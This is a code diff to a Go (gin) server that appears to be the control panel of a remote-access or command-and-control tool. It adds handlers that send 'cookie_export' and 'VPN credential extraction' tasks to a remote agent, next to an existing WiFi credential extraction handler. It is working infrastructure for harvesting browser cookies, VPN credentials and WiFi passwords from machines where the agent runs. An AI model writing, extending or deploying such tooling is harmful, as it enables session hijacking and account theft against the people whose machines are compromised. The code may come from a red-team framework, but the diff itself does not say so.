@@ -10,6 +10,43 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
+// handleCookieExport dispatches cookie_export task to the agent.
+func (s *Server) handleCookieExport(c *gin.Context) {
+	id := c.Param("id")
+	browser := c.PostForm("browser")
+	if browser == "" {
+		browser = c.Query("browser")
+	}
+	if browser == "" {
+		browser = "all"
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "cookie_export", browser, "", "", "", 0, 0)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	s.LogAuditRecord(c, "cookie_export", "agent", id, "Cookie export: "+browser, true, nil)
+	s.dispatchTask(c, task, "cookie_export", "Cookie export: "+browser)
+}
+
+// handleVpnCreds dispatches vpn_creds task to the agent.
+func (s *Server) handleVpnCreds(c *gin.Context) {
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "vpn_creds", "", "", "", "", 0, 0)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	s.LogAuditRecord(c, "vpn_creds", "agent", id, "VPN credential extraction", true, nil)
+	s.dispatchTask(c, task, "vpn_creds", "VPN credential extraction")
+}
+
 // handleWifiCreds handles WiFi credential extraction
 func (s *Server) handleWifiCreds(c *gin.Context) {
 	user := c.GetString("username")
